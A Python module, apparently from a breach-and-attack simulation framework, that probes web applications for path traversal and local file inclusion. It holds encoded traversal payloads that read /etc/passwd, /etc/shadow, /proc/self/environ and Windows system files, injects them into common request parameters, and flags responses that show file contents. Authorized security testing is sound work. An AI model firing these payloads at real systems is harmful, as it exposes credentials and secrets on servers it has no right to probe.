"""Path Traversal / LFI testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "....//....//....//etc/shadow", "/etc/passwd%00.png", "php://filter/convert.base64-encode/resource=/etc/passwd",
    "..%00/..%00/..%00/etc/passwd", "../../../proc/self/environ",
    "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....\\\\....\\\\....\\\\etc/passwd", "/..%252F..%252F..%252Fetc/passwd",
]

class PathTraversalModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="path_traversal", description="Path traversal / LFI with encoding bypasses",
            category="path_traversal", mitre_technique_ids=["T1190"],
            mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A01:2021 - Broken Access Control",
            cwe_ids=["CWE-22"], tags=["traversal", "lfi", "file_read"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            p = await self._payload_db.get_payloads("path_traversal", limit=100)
            if p: return p
        return DEFAULT_TRAVERSAL_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        params = options.get("params", ["file", "path", "page", "template", "include", "doc", "folder", "img"])
        return [AttackRequest(request_id=f"lfi-{uuid.uuid4().hex[:8]}", target=target, method="GET",
            path=options.get("path", "/"), params={param: p},
            headers={"X-BAS-Payload": p[:50]}) for p in payloads for param in params[:3]]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        indicators = [("root:x:0:0", "critical", "/etc/passwd"), ("[extensions]", "critical", "win.ini"),
            ("[boot loader]", "critical", "win.ini"), ("DOCUMENT_ROOT", "high", "proc/environ"),
            ("HTTP_HOST", "high", "proc/environ")]
        for ind, sev, desc in indicators:
            if ind in body:
                return ModuleResult(module_name="path_traversal", target=request.target, status=VulnStatus.VULNERABLE,
                    payload_used=payload, response_code=response.status_code, response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms, evidence=f"Path traversal: {desc} content detected",
                    severity=sev, mitre_technique_id="T1190")
        return ModuleResult(module_name="path_traversal", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
